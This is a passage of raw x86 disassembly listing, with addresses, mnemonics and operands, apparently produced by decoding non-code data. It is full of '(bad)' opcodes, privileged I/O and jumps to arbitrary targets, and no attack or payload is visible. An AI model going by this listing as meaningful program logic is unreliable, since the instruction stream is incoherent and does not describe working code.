  4a78a5:	out    0x95,eax
  4a78a7:	cld    
  4a78a8:	imul   BYTE PTR [ecx-0x39386feb]
  4a78ae:	les    ebx,FWORD PTR [edx-0x78]
  4a78b1:	dec    edi
  4a78b2:	inc    ebp
  4a78b3:	fisubr WORD PTR [esi+0x68060082]
  4a78b9:	lods   al,BYTE PTR ds:[esi]
  4a78ba:	daa    
  4a78bb:	add    al,0xa7
  4a78bd:	and    eax,0xdab818af
  4a78c2:	push   0x5c227029
  4a78c7:	les    edi,FWORD PTR ss:[ecx+0x2c32a790]
  4a78ce:	inc    eax
  4a78cf:	aam    0x12
  4a78d1:	stos   DWORD PTR es:[edi],eax
  4a78d2:	test   al,0x51
  4a78d4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a78d5:	sub    ah,BYTE PTR [eax+edx*8]
  4a78d8:	ror    DWORD PTR [ebx+0x3a],1
  4a78db:	and    edi,ebp
  4a78dd:	ss push 0x2b564aec
  4a78e3:	jo     0x4a7947
  4a78e5:	cmp    esp,ebp
  4a78e7:	cwde   
  4a78e8:	xlat   BYTE PTR ds:[ebx]
  4a78e9:	push   edi
  4a78ea:	in     eax,0x9c
  4a78ec:	pop    edi
  4a78ed:	or     DWORD PTR [ebx+0x4],edi
  4a78f0:	stc    
  4a78f1:	aas    
  4a78f2:	mov    eax,0xcb572708
  4a78f7:	xor    eax,0x427e904c
  4a78fc:	test   DWORD PTR [edi+eax*2+0x6],ecx
  4a7900:	adc    DWORD PTR [edx+ecx*1+0x4c384c11],esp
  4a7907:	jno    0x4a78f5
  4a7909:	(bad)  
  4a790a:	mov    al,0x1e
  4a790c:	push   ss
  4a790d:	push   edx
  4a790e:	ds push 0xd821404b
  4a7914:	fst    DWORD PTR [eax+0x2b]
  4a7917:	dec    ebp
  4a7918:	adc    BYTE PTR [esp+edx*2-0x41],cl
  4a791c:	dec    ebp
  4a791d:	ins    BYTE PTR es:[edi],dx
  4a791e:	imul   esp,DWORD PTR [edi+ebp*1],0x48
  4a7922:	add    al,0x51
  4a7924:	push   esp
  4a7925:	push   edi
  4a7926:	add    al,0xe0
  4a7928:	sbb    DWORD PTR [ecx+0x49e4fc4d],ecx
  4a792e:	adc    eax,0x16024cd6
  4a7933:	xchg   esi,eax
  4a7934:	sar    DWORD PTR [esi+0x40],cl
  4a7937:	fcmovbe st,st(0)
  4a7939:	pop    ecx
  4a793a:	or     edx,DWORD PTR [esi]
  4a793c:	xchg   BYTE PTR [eax+0x73],ch
  4a793f:	push   esi
  4a7940:	shl    BYTE PTR [eax-0x8542aef],cl
  4a7946:	fsubr  QWORD PTR [ebp-0x182c5e5f]
  4a794c:	xor    bl,cl
  4a794e:	pop    ecx
  4a794f:	push   eax
  4a7950:	xor    edx,DWORD PTR [ecx+0x1bac0548]
  4a7956:	mov    al,0xdd
  4a7958:	ret    0x62ea
  4a795b:	inc    eax
  4a795c:	outs   dx,BYTE PTR ds:[esi]
  4a795d:	mov    esp,0x92a0af7c
  4a7962:	add    BYTE PTR [esi+0x29],dl
  4a7965:	outs   dx,BYTE PTR ds:[esi]
  4a7966:	mov    ebp,0xb732b239
  4a796b:	or     cl,dl
  4a796d:	add    DWORD PTR [edi],eax
  4a796f:	retf   
  4a7970:	and    DWORD PTR [eax],esi
  4a7972:	pushf  
  4a7973:	sbb    bh,BYTE PTR [ebx+0x57ad215e]
  4a7979:	add    BYTE PTR [edi],ah
  4a797b:	dec    edx
  4a797c:	jo     0x4a796b
  4a797e:	jbe    0x4a79c0
  4a7980:	and    BYTE PTR [ecx+0x7342a88],ch
  4a7986:	inc    eax
  4a7987:	nop
  4a7988:	add    DWORD PTR [esi],ebp
  4a798a:	cmp    eax,0x8d5650bf
  4a798f:	add    edi,edx
  4a7991:	sahf   
  4a7992:	pushf  
  4a7993:	ds dec edx
  4a7995:	add    DWORD PTR [ebp-0x19],edx
  4a7998:	mov    esp,0x84e8e3ae
  4a799d:	fcom   st(3)
  4a799f:	jne    0x4a79a9
  4a79a1:	ins    DWORD PTR es:[edi],dx
  4a79a2:	mov    ds:0x5c02eeb2,eax
  4a79a7:	add    DWORD PTR [eax-0x3e],ebp
  4a79aa:	dec    ebx
  4a79ab:	shr    dl,0xc5
  4a79ae:	gs inc esp
  4a79b0:	sbb    eax,0x1c047759
  4a79b5:	rcr    BYTE PTR [edi+0x14f04654],1
  4a79bb:	jmp    0x4a79c1
  4a79bd:	cmp    al,0x62
  4a79bf:	push   0x67
  4a79c1:	jne    0x4a7963
  4a79c3:	mov    al,0xf1
  4a79c5:	cmp    ebx,DWORD PTR [edx+0x7]
  4a79c8:	out    dx,al
  4a79c9:	xor    al,0x94
  4a79cb:	jmp    0x19a5db1
  4a79d0:	dec    ecx
  4a79d1:	ins    BYTE PTR es:[edi],dx
  4a79d2:	call   0xa39521e8
  4a79d7:	sub    al,0x60
  4a79d9:	add    bh,BYTE PTR [esi+0x4]
  4a79dc:	jno    0x4a7a03
  4a79de:	call   ebx
  4a79e0:	fcmovbe st,st(7)
  4a79e2:	mov    ebp,0x3bb44168
  4a79e7:	push   eax
  4a79e8:	jge    0x4a7a1f
  4a79ea:	sahf   
  4a79eb:	adc    al,BYTE PTR [ebx+0x3a]
  4a79ee:	xor    ah,BYTE PTR [edi+eax*1]
  4a79f1:	cmc    
  4a79f2:	mov    dl,0x7
  4a79f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4a79f5:	mov    edx,0xd75f5c44
  4a79fa:	pop    ecx
  4a79fb:	mov    DWORD PTR [eax+0x5],esi
  4a79fe:	sbb    dl,cl
  4a7a00:	cmp    DWORD PTR [esi-0x3f71293b],ebx
  4a7a06:	push   eax
  4a7a07:	xchg   ebp,eax
  4a7a08:	jmp    0x4a7a3d
  4a7a0a:	mov    dh,0x27
  4a7a0c:	dec    esp
  4a7a0d:	jb     0x4a7990
  4a7a0f:	jl     0x4a7a7a
  4a7a11:	push   eax
  4a7a12:	push   cs
  4a7a13:	daa    
  4a7a14:	mov    al,0x1
  4a7a16:	fdiv   QWORD PTR [esi-0x79adba45]
  4a7a1c:	adc    al,0xac
  4a7a1e:	sbb    DWORD PTR [eax],edi
  4a7a20:	sub    DWORD PTR ds:0xb9c7bf5f,ecx
  4a7a26:	aaa    
  4a7a27:	push   cs
  4a7a28:	(bad)  
  4a7a29:	int3   
  4a7a2a:	mov    ch,0x5a
  4a7a2c:	sub    DWORD PTR fs:[ebp-0x6f6c9d01],eax
  4a7a33:	add    dl,BYTE PTR [ecx+0x5d]
  4a7a36:	or     BYTE PTR ds:0x8002c6de,ch
  4a7a3c:	adc    ch,BYTE PTR cs:[esi-0x17226c0b]
  4a7a43:	push   edx
  4a7a44:	enter  0x5050,0x52
  4a7a48:	ret    0x4240
  4a7a4b:	cmp    BYTE PTR [ecx+0x224b5e3f],ah
  4a7a51:	pop    ebp
  4a7a52:	hlt    
  4a7a53:	xchg   ecx,eax
  4a7a54:	dec    edi
  4a7a55:	push   bx
  4a7a57:	shl    BYTE PTR [edi-0x6b],1
  4a7a5a:	xchg   esi,eax
  4a7a5b:	pop    esi
  4a7a5c:	daa    
  4a7a5d:	test   BYTE PTR [ecx],al
  4a7a5f:	xchg   ebp,eax
  4a7a60:	out    dx,eax
  4a7a61:	dec    esp
  4a7a62:	jmp    0x6ff3:0x5d28fae3
  4a7a69:	aam    0x48
  4a7a6b:	and    eax,0xd0ac2b02
  4a7a70:	mov    esp,0xebd2b1a8
  4a7a75:	jl     0x4a7a6f
  4a7a77:	sub    eax,0x686865cd
  4a7a7c:	xor    eax,0x27c4404e
  4a7a81:	popa   
  4a7a82:	data16 adc dl,BYTE PTR [esi+0x51]
  4a7a86:	xchg   ecx,eax
  4a7a87:	inc    ebx
  4a7a88:	xor    BYTE PTR [ebx],dl
  4a7a8a:	push   ecx
  4a7a8b:	clc    
  4a7a8c:	jo     0x4a7aad
  4a7a8e:	call   0x48cc7fa7
  4a7a93:	pop    ss
  4a7a94:	in     al,dx
  4a7a95:	cmp    al,0x16
  4a7a97:	out    0x76,eax
  4a7a99:	sar    BYTE PTR [eax+eax*1+0x67],0x1a
  4a7a9e:	mov    dh,0xda
  4a7aa0:	jg     0x4a7a41
  4a7aa2:	xchg   ch,cl
  4a7aa4:	out    0xd4,al
  4a7aa6:	lea    eax,[ecx+eax*2+0x10]
  4a7aaa:	push   eax
  4a7aab:	out    dx,al
  4a7aac:	hlt    
  4a7aad:	aam    0x9
  4a7aaf:	fs pop ebp
  4a7ab1:	mov    ebx,0xf1f4f586
  4a7ab6:	cmp    al,BYTE PTR [edi+ebp*4+0x74e075de]
  4a7abd:	ret    0x90d0
  4a7ac0:	aas    
  4a7ac1:	bound  esi,QWORD PTR [si+0x17]
  4a7ac5:	ss (bad) 
  4a7ac7:	jbe    0x4a7b02
  4a7ac9:	sbb    al,0x74
  4a7acb:	or     eax,0x4b5eb700
  4a7ad0:	fs popf 
  4a7ad2:	retf   
  4a7ad3:	dec    ecx
  4a7ad4:	jnp    0x4a7b37
  4a7ad6:	iret   
  4a7ad7:	pop    ds
  4a7ad8:	mov    bh,0x50
  4a7ada:	add    cl,dl
  4a7adc:	jmp    0x55da:0x68365302
  4a7ae3:	nop
  4a7ae4:	into   
  4a7ae5:	scas   eax,DWORD PTR es:[edi]
  4a7ae6:	aam    0xd0
  4a7ae8:	jb     0x4a7ab1
  4a7aea:	loope  0x4a7a94
  4a7aec:	xor    al,0x74
  4a7aee:	je     0x4a7a7d
  4a7af0:	js     0x4a7b29
  4a7af2:	cld    
  4a7af3:	lock rcr DWORD PTR ds:0xf6385f53,1
  4a7afa:	adc    edi,DWORD PTR [edi]
  4a7afc:	lea    eax,[ebx-0x27]
  4a7aff:	data16 sbb BYTE PTR [esi],bh
  4a7b02:	out    0x7e,al
  4a7b04:	add    dl,BYTE PTR [ecx-0x7e]
  4a7b07:	add    BYTE PTR [eax],bh
  4a7b09:	(bad)  
  4a7b0a:	lds    ebp,FWORD PTR [ebx+0x6]
  4a7b0d:	jg     0x4a7b1b
  4a7b0f:	sbb    BYTE PTR [edi],cl
  4a7b11:	and    ecx,DWORD PTR [edx+ecx*4+0x478afc57]
  4a7b18:	dec    ebp
  4a7b19:	sub    edx,DWORD PTR [esi+0x169efd88]
  4a7b1f:	out    0x56,al
  4a7b21:	push   esi
  4a7b22:	or     DWORD PTR [ebx],edx
  4a7b24:	sub    eax,0x81bac2c
  4a7b29:	xchg   DWORD PTR [ecx],edi
  4a7b2b:	ret    0x74f3
  4a7b2e:	cmp    esp,ebx
  4a7b30:	push   esi
  4a7b31:	or     ebp,ebp
  4a7b33:	push   es
  4a7b34:	inc    edx
  4a7b35:	or     al,0xdb
  4a7b37:	add    DWORD PTR [edx-0x34],esi
  4a7b3a:	sub    ah,0x84
  4a7b3d:	xchg   ecx,eax
  4a7b3e:	xor    ah,BYTE PTR ss:[esi+0x176c42d4]
  4a7b45:	adc    al,0x61
  4a7b47:	sub    eax,0x6432ae1d
  4a7b4c:	fs pop edx
  4a7b4e:	sar    DWORD PTR [edx+0x14004b8],cl
  4a7b54:	mov    bl,bh
  4a7b56:	mov    bh,0x19
  4a7b58:	sbb    dl,BYTE PTR [ecx-0x7e]
  4a7b5b:	in     al,dx
  4a7b5c:	push   eax
  4a7b5d:	adc    DWORD PTR [ebx+0xb],edx
  4a7b60:	push   esi
  4a7b61:	imul   esi,DWORD PTR [edx-0x36],0x2e
  4a7b65:	mov    al,BYTE PTR [edx+0x2]
  4a7b68:	fld    TBYTE PTR [eax]
  4a7b6a:	in     al,0x41
  4a7b6c:	adc    al,0xdd
  4a7b6e:	push   ecx
  4a7b6f:	push   ebp
  4a7b70:	pusha  
  4a7b71:	mov    ds:0x58020190,al
  4a7b76:	iret   
  4a7b77:	vcvtsi2ss xmm5,xmm1,DWORD PTR [ebp+0x6a]
  4a7b7c:	and    BYTE PTR [esi-0x433a954],bl
  4a7b82:	hlt    
  4a7b83:	lds    eax,FWORD PTR [edx]
  4a7b85:	mov    ebp,0x96e4d938
  4a7b8a:	jne    0x4a7b74
  4a7b8c:	cmp    esi,DWORD PTR [ebp-0x50]
  4a7b8f:	cmc    
  4a7b90:	jb     0x4a7ba6
  4a7b92:	lods   al,BYTE PTR ds:[esi]
  4a7b93:	and    BYTE PTR [ecx],bl
  4a7b95:	mov    ah,0x9e
  4a7b97:	outs   dx,BYTE PTR ds:[esi]
  4a7b98:	test   DWORD PTR [edx+esi*2],ebp
  4a7b9b:	test   al,0x1
  4a7b9d:	in     eax,dx
  4a7b9e:	or     edx,DWORD PTR [eax]
  4a7ba0:	clc    
  4a7ba1:	xor    BYTE PTR [edx+esi*1],0x6e
  4a7ba5:	jecxz  0x4a7b33
  4a7ba7:	xchg   ebp,eax
  4a7ba8:	sub    al,0x76
  4a7baa:	aas    
  4a7bab:	pop    esp
  4a7bac:	ror    DWORD PTR [ebx],cl
  4a7bae:	push   ss
  4a7baf:	inc    ecx
  4a7bb0:	dec    ebp
  4a7bb1:	jne    0x4a7bb5
  4a7bb3:	pop    edi
  4a7bb4:	les    esi,FWORD PTR cs:[eax]
  4a7bb7:	test   BYTE PTR [ecx],al
  4a7bb9:	dec    edi
  4a7bba:	fiadd  WORD PTR [esi-0x3a8d3a73]
  4a7bc0:	enter  0x9fbe,0xad
  4a7bc4:	sub    BYTE PTR [esp],al
  4a7bc7:	mov    ds:0xab862d00,al
  4a7bcc:	and    al,0xc
  4a7bce:	ins    DWORD PTR es:[edi],dx
  4a7bcf:	push   edx
  4a7bd0:	push   es
  4a7bd1:	dec    edx
  4a7bd2:	sbb    cl,BYTE PTR [edx+eax*1-0xdb07a10]
  4a7bd9:	sub    bl,0xe8
  4a7bdc:	inc    esp
  4a7bdd:	jmp    0x4a7b93
  4a7bdf:	push   esi
  4a7be0:	sbb    DWORD PTR [ebx+0x78],0x53d02d2e
  4a7be7:	jnp    0x4a7c65
  4a7be9:	lock dec edx
  4a7beb:	mov    ebp,0x986c8a87
  4a7bf0:	js     0x4a7c18
  4a7bf2:	repnz push 0x973a7981
  4a7bf8:	into   
  4a7bf9:	in     eax,0x7c
  4a7bfb:	xor    BYTE PTR [eax+esi*8+0x3d],dh
  4a7bff:	inc    ecx
  4a7c00:	xor    esp,DWORD PTR [ebp-0x7801614]
  4a7c06:	cmp    cl,ch
  4a7c08:	push   ebp
  4a7c09:	rcr    BYTE PTR [ebp+eiz*8-0x7f],0x5a
  4a7c0e:	pop    ebp
  4a7c0f:	add    eax,0x93222923
  4a7c14:	lods   eax,DWORD PTR ds:[esi]
  4a7c15:	or     eax,0x66569905
  4a7c1a:	(bad)  
  4a7c1b:	cld    
  4a7c1c:	push   cs
  4a7c1d:	(bad)
  4a7c21:	(bad)  
  4a7c22:	lock sbb al,bl
  4a7c25:	add    BYTE PTR [eax+ebp*8],al
  4a7c28:	mov    edx,0x7fdcdf46
  4a7c2d:	add    ecx,DWORD PTR [edi]
  4a7c2f:	add    cl,dh
  4a7c31:	and    BYTE PTR [edi-0xd],bl
  4a7c34:	xor    al,0xde
  4a7c36:	nop
  4a7c37:	push   cs
  4a7c38:	sub    bh,dl
  4a7c3a:	push   eax
  4a7c3b:	retf   0xb7cb
  4a7c3e:	ret    0xf666
  4a7c41:	pop    ebp
  4a7c42:	fadd   DWORD PTR [esi-0x1]
  4a7c45:	add    DWORD PTR [edi+0x31],ecx
  4a7c48:	adc    al,0x50
  4a7c4a:	cli    
  4a7c4b:	(bad)  
  4a7c4c:	iret   
  4a7c4d:	cmp    DWORD PTR [ebx+ecx*4],esp
  4a7c50:	js     0x4a7c7e
  4a7c52:	pop    edx
  4a7c53:	inc    eax
  4a7c54:	aad    0x96
  4a7c56:	rcr    DWORD PTR [eax],1
  4a7c58:	push   ds
  4a7c59:	mov    ah,0x10
  4a7c5b:	add    DWORD PTR [ebx+0x5c],esp
  4a7c5e:	pop    ecx
  4a7c5f:	push   cs
  4a7c60:	xor    DWORD PTR [eax],0x25f0bd34
  4a7c66:	dec    ebx
  4a7c67:	mov    gs,WORD PTR [edx+0xbf5a49]
  4a7c6d:	and    eax,0x50576421
  4a7c72:	push   ebx
  4a7c73:	xchg   edx,eax
  4a7c74:	or     BYTE PTR [eax+0x468ab2b],dh
  4a7c7a:	popa   
  4a7c7b:	pop    ds
  4a7c7c:	sbb    cl,cl
  4a7c7e:	dec    ebp
  4a7c7f:	adc    ah,BYTE PTR [ebp-0xb7c1354]
  4a7c85:	jo     0x4a7c60
  4a7c87:	add    BYTE PTR [eax],dh
  4a7c89:	daa    
  4a7c8a:	data16 aam 0x4
  4a7c8d:	sahf   
  4a7c8e:	mov    bh,0x29
  4a7c90:	test   DWORD PTR [eax-0x2e6f3ede],eax
  4a7c96:	inc    esi
  4a7c97:	call   0xea28:0x564c2432
  4a7c9e:	pop    ss
  4a7c9f:	mov    BYTE PTR [ecx],ah
  4a7ca1:	mov    ch,0xe8
  4a7ca3:	addr16 or eax,0x5bc49e3d
  4a7ca9:	xchg   esp,eax
  4a7caa:	adc    al,0xf4
  4a7cac:	retf   0x45b8
  4a7caf:	sti    
  4a7cb0:	inc    esi
  4a7cb1:	sbb    ah,BYTE PTR [ecx+0x38]
  4a7cb4:	sbb    eax,0x283611c1
  4a7cb9:	test   eax,0x834bc7c4
  4a7cbe:	dec    eax
  4a7cbf:	enter  0x6a5c,0x34
  4a7cc3:	add    DWORD PTR [ebx+0x4b],ebx
  4a7cc6:	jl     0x4a7c4a
  4a7cc8:	call   0x4379:0xc71aa0c8
  4a7ccf:	sub    dl,al
  4a7cd1:	sub    al,0xe9
  4a7cd3:	xchg   esp,eax
  4a7cd4:	xchg   DWORD PTR [edi],esp
  4a7cd6:	jge    0x4a7cfb
  4a7cd8:	je     0x4a7c5e
  4a7cda:	jo     0x4a7cc4
  4a7cdc:	mov    edx,DWORD PTR [esi+0x1ad34b93]
  4a7ce2:	push   eax
  4a7ce3:	ins    BYTE PTR es:[edi],dx
  4a7ce4:	in     al,0x78
  4a7ce6:	mov    DWORD PTR [esi],edx
  4a7ce8:	push   ebx
  4a7ce9:	sub    esp,ebx
  4a7ceb:	rcl    DWORD PTR [eax+ecx*8+0x78d203a6],1
  4a7cf2:	in     eax,0x8a
  4a7cf4:	(bad)  
  4a7cf5:	int3   
  4a7cf6:	and    BYTE PTR [eax-0x47],al
  4a7cf9:	dec    edi
  4a7cfa:	and    al,0x69
  4a7cfc:	sub    cl,al
  4a7cfe:	rol    BYTE PTR [edi],1
  4a7d00:	enter  0x5f82,0x43
  4a7d04:	or     eax,0xa9e96e0c
  4a7d09:	ror    dl,0x9c
  4a7d0c:	xor    edx,DWORD PTR [edx]
  4a7d0e:	mov    esp,DWORD PTR [eax]
  4a7d10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a7d11:	pop    ds
  4a7d12:	je     0x4a7d14
  4a7d14:	out    dx,al
  4a7d15:	pop    esi
  4a7d16:	adc    DWORD PTR [eax+0x7d800f53],eax
  4a7d1c:	enter  0xc614,0xd6
  4a7d20:	dec    ecx
  4a7d21:	nop
  4a7d22:	pop    ss
  4a7d23:	pop    ebp
  4a7d24:	or     ch,BYTE PTR [eax-0x2e]
  4a7d27:	or     ebx,DWORD PTR [eax-0x7d]
  4a7d2a:	or     BYTE PTR [esp+edx*2+0x7f2548ba],dl
  4a7d31:	fcom   QWORD PTR ds:0xf3403010
  4a7d37:	or     al,0xf4
  4a7d39:	cmc    
  4a7d3a:	xchg   esp,eax
  4a7d3b:	mov    BYTE PTR [ebx+0x15],cl
  4a7d3e:	out    dx,al
  4a7d3f:	(bad)  
  4a7d41:	push   0xe6bd8c96
  4a7d46:	mov    dh,0x9
  4a7d48:	shr    BYTE PTR [ecx+0xa],cl
  4a7d4b:	cmp    BYTE PTR [esp+ebx*1],bl
  4a7d4e:	add    ah,BYTE PTR [esi]
  4a7d50:	scas   eax,DWORD PTR es:[edi]
  4a7d51:	mov    ds:0x2ce4b4d2,eax
  4a7d56:	loopne 0x4a7d7c
  4a7d58:	jge    0x4a7cf8
  4a7d5a:	jnp    0x4a7d94
  4a7d5c:	sub    al,0x5
  4a7d5e:	out    dx,eax
  4a7d5f:	add    BYTE PTR [ecx-0x2f],al
  4a7d62:	outs   dx,DWORD PTR ds:[esi]
  4a7d63:	pop    edx
  4a7d64:	psrad  mm6,QWORD PTR [esi]
  4a7d67:	mov    eax,0x84351a34
  4a7d6c:	std    
  4a7d6d:	adc    DWORD PTR [ebx-0x2edb206a],ebp
  4a7d73:	add    dl,dl
  4a7d75:	test   DWORD PTR [ebx+0xa017852],esi
  4a7d7b:	sub    ecx,DWORD PTR [edx]
  4a7d7d:	dec    ecx
  4a7d7e:	imul   ebp,edi,0x2b
  4a7d81:	lods   al,BYTE PTR ds:[esi]
  4a7d82:	jg     0x7d5c9d06
  4a7d88:	(bad)
  4a7d8d:	jle    0x4a7d4f
  4a7d8f:	js     0xfd8f09ed
  4a7d95:	aad    0x28
  4a7d97:	popf   
  4a7d98:	dec    edi
  4a7d99:	mov    ds:0x31c9418,al
  4a7d9e:	(bad)  
  4a7d9f:	sahf   
  4a7da0:	imul   BYTE PTR [esi+0x1a1e9b0d]
  4a7da6:	adc    ah,BYTE PTR [eax-0x48]
  4a7da9:	jbe    0x4a7d85
  4a7dab:	inc    ebx
  4a7dac:	xor    al,0x42
  4a7dae:	adc    al,0x40
  4a7db0:	or     ch,BYTE PTR [eax+ebp*8+0x61]
  4a7db4:	popf   
  4a7db5:	inc    esp
  4a7db6:	hlt    
  4a7db7:	enter  0x196c,0xe0
  4a7dbb:	inc    esp
  4a7dbd:	lahf   
  4a7dbe:	lods   al,BYTE PTR ss:[esi]
  4a7dc0:	and    dh,bl
  4a7dc2:	push   ds
  4a7dc3:	sbb    al,0x58
  4a7dc5:	push   0xffffffe4
  4a7dc7:	cmp    DWORD PTR [esi],0x1056f534
  4a7dcd:	sbb    eax,0xc08d8d2c
  4a7dd2:	or     bh,ah
  4a7dd4:	daa    
  4a7dd5:	cmc    
  4a7dd6:	int3   
  4a7dd7:	mov    edx,0x384feec
  4a7ddc:	add    DWORD PTR [ebx],ebp
  4a7dde:	sub    ecx,esp
  4a7de0:	fs mov cl,0xe0
  4a7de3:	dec    ebp
  4a7de4:	push   edx
  4a7de5:	or     cl,BYTE PTR [ebp+0x715fc46]
  4a7deb:	fs xor eax,0xb68e80ac
  4a7df1:	clc    
  4a7df2:	pop    edx
  4a7df3:	adc    ah,BYTE PTR [ecx-0x23]
  4a7df6:	es int 0xc8
  4a7df9:	cld    
  4a7dfa:	xor    al,0x24
  4a7dfc:	ror    DWORD PTR [ebx],1
  4a7dfe:	xlat   BYTE PTR ds:[ebx]
  4a7dff:	shr    BYTE PTR [esi-0x7cb3f494],cl
  4a7e05:	loop   0x4a7e2f
  4a7e07:	xchg   ebp,eax
  4a7e08:	xor    BYTE PTR [esi+0x31e0c56],dh
  4a7e0e:	test   BYTE PTR [esi+ecx*4],cl
  4a7e11:	(bad)  
  4a7e12:	les    ebx,FWORD PTR [edi-0x6e]
  4a7e15:	mov    ds:0x75c80981,al
  4a7e1a:	add    esp,DWORD PTR [edx+0x76]
  4a7e1d:	cmp    al,al
  4a7e1f:	enter  0xd6b6,0xa0
  4a7e23:	mov    esp,0x66ad010a
  4a7e28:	mov    eax,esp
  4a7e2a:	xchg   esp,eax
  4a7e2b:	and    BYTE PTR [esi],cl
  4a7e2d:	test   al,0x3d
  4a7e2f:	sub    BYTE PTR [eax],ch
  4a7e31:	int    0xac
  4a7e33:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4a7e34:	jb     0x4a7df8
  4a7e36:	mov    esp,0x5bcddd05
  4a7e3b:	xor    eax,0xef167e74
  4a7e40:	or     eax,DWORD PTR [ebx-0x747f8219]
  4a7e46:	das    
  4a7e47:	sbb    eax,0x2ef96224
  4a7e4c:	mov    BYTE PTR [edi],dl
  4a7e4e:	sbb    DWORD PTR [ecx],esp
  4a7e50:	sahf   
  4a7e51:	gs pushf 
  4a7e53:	pop    edx
  4a7e54:	jl     0x4a7dd6
  4a7e56:	test   BYTE PTR [edx+0x4a352009],al
  4a7e5c:	hlt    
  4a7e5d:	or     eax,0xfba542c1
  4a7e62:	outs   dx,BYTE PTR ds:[esi]
  4a7e63:	xchg   edi,eax
  4a7e64:	or     BYTE PTR [ebx+ebx*1+0xa],bh
  4a7e68:	pop    ecx
  4a7e69:	nop
  4a7e6a:	adc    eax,0x2d0c081c
  4a7e6f:	lds    edx,FWORD PTR [edx+edi*1+0x4f74ba96]
  4a7e76:	xchg   DWORD PTR [edx+0xf330802],edi
  4a7e7c:	mov    eax,0x405da650
  4a7e81:	or     BYTE PTR [eax-0xffc27fc],bl
  4a7e87:	imul   ecx,DWORD PTR [edi-0x72],0x40056c86
  4a7e8e:	ss mov ebp,0x9c34b8db
  4a7e94:	jo     0x4a7ebb
  4a7e96:	aam    0x1
  4a7e98:	je     0x4a7ebd
  4a7e9a:	cmp    eax,0xf9edc548
  4a7e9f:	or     al,0x0
  4a7ea1:	je     0x4a7eb6
  4a7ea3:	add    BYTE PTR [edx],bl
  4a7ea5:	sub    bh,BYTE PTR [eax-0x2f889817]
  4a7eab:	pop    ebx
  4a7eac:	push   0xffffffc0
  4a7eae:	pushf  
  4a7eaf:	fwait
  4a7eb0:	sbb    al,0x50
  4a7eb2:	test   eax,0x5f79c159
  4a7eb7:	fimul  DWORD PTR [ebx]
  4a7eb9:	mov    edx,0x7eb9c17
  4a7ebe:	cmp    al,BYTE PTR [eax]
  4a7ec0:	add    DWORD PTR [edi+0x70a12a51],esi
  4a7ec6:	shr    BYTE PTR [ecx+eax*4-0x1f9ea1f],1
  4a7ecd:	and    DWORD PTR [esi+ebx*8],ebp
  4a7ed0:	xor    BYTE PTR [eax],al
  4a7ed2:	ja     0x4a7f2b
  4a7ed4:	je     0x4a7f24
  4a7ed6:	lods   eax,DWORD PTR ds:[esi]
  4a7ed7:	sub    edx,DWORD PTR [edx+0x1b10c2eb]
  4a7edd:	add    bh,BYTE PTR [ebx]
  4a7edf:	mov    esp,cr1
  4a7ee2:	mov    al,ds:0xd202d339
  4a7ee7:	mov    eax,0x7b54ad0a
  4a7eec:	and    BYTE PTR [ebx],cl
  4a7eee:	das    
  4a7eef:	ins    DWORD PTR es:[edi],dx
  4a7ef0:	gs push edi
  4a7ef2:	inc    eax
  4a7ef3:	jp     0x4a7e93
  4a7ef5:	neg    BYTE PTR [eax+ecx*1]
  4a7ef8:	sub    bl,BYTE PTR [eax+0x2]
  4a7efb:	mov    BYTE PTR [ecx-0x7d],bl
  4a7efe:	mov    edi,0x8588a75b
  4a7f03:	imul   ecx,DWORD PTR [edx],0xdb84aeb
  4a7f09:	or     ebx,ecx
  4a7f0b:	jb     0x4a7eb3
  4a7f0d:	sub    cl,BYTE PTR [ebp-0x9]
  4a7f10:	push   cs
  4a7f11:	jmp    0x4a7ed7
  4a7f13:	mov    eax,ds:0xb3501840
  4a7f18:	setns  BYTE PTR [ecx+0x39f4b4a]
  4a7f1f:	sbb    al,0x17
  4a7f21:	add    DWORD PTR [eax-0x57],ecx
  4a7f24:	int3   
  4a7f25:	sub    dl,BYTE PTR [eax]
  4a7f27:	mov    ds:0x8a758501,eax
  4a7f2c:	sbb    ah,BYTE PTR [eax+0x4402b82c]
  4a7f32:	add    DWORD PTR [edx],edx
  4a7f34:	loopne 0x4a7ecd
  4a7f36:	sbb    al,0x9c
  4a7f38:	repz push DWORD PTR [edx+ebx*2-0x9]
  4a7f3d:	pop    esp
  4a7f3e:	nop
  4a7f3f:	push   cs
  4a7f40:	ror    dl,1
  4a7f42:	lea    edx,[ecx+0x58]
  4a7f45:	push   edi
  4a7f46:	cld    
  4a7f47:	and    ah,BYTE PTR [ebp-0x767b70b2]
  4a7f4d:	pop    ds
  4a7f4e:	nop
  4a7f4f:	mov    eax,0x72106903
  4a7f54:	dec    ebp
  4a7f55:	les    ebx,FWORD PTR [esi]
  4a7f57:	push   0xffffffae
  4a7f59:	add    eax,0xb870a38f
  4a7f5e:	mov    ebp,0xf6b48916
  4a7f63:	jns    0x4a7fa6
  4a7f65:	sbb    bl,dl
  4a7f67:	mov    ebx,0x7d4abd0c
  4a7f6c:	push   ss
  4a7f6d:	mov    dl,BYTE PTR [ebx]
  4a7f6f:	loope  0x4a7f29
  4a7f71:	cmc    
  4a7f72:	inc    ecx
  4a7f73:	ins    DWORD PTR es:[edi],dx
  4a7f74:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4a7f75:	call   0x7d2c65c
  4a7f7a:	mov    dh,0x14
  4a7f7c:	push   esi
  4a7f7d:	push   ebp
  4a7f7e:	add    bh,dh
  4a7f80:	cmp    BYTE PTR [eax+0x9],0xc6
  4a7f84:	ins    DWORD PTR es:[edi],dx
  4a7f85:	and    BYTE PTR [eax+0x2bc7c20f],dl
  4a7f8b:	in     al,dx
  4a7f8c:	cmp    al,0x40
  4a7f8e:	cwde   
  4a7f8f:	adc    dh,BYTE PTR [edx-0x324e4fb8]
  4a7f95:	or     al,0x6
  4a7f97:	cmp    edi,ebp
  4a7f99:	aaa    
  4a7f9a:	shr    DWORD PTR [eax+0x40],1
  4a7f9d:	das    
  4a7f9e:	fidiv  WORD PTR [ecx*4-0x421db684]
  4a7fa5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4a7fa6:	add    eax,0x518002b9
  4a7fab:	xchg   edx,eax
  4a7fac:	dec    eax
  4a7fad:	pop    esp
  4a7fae:	and    al,0x2a
  4a7fb0:	adc    BYTE PTR [edi+0x3dcde458],al
  4a7fb6:	cmp    BYTE PTR [eax+0x43958809],0x70
  4a7fbd:	aas    
  4a7fbe:	ds push ebp
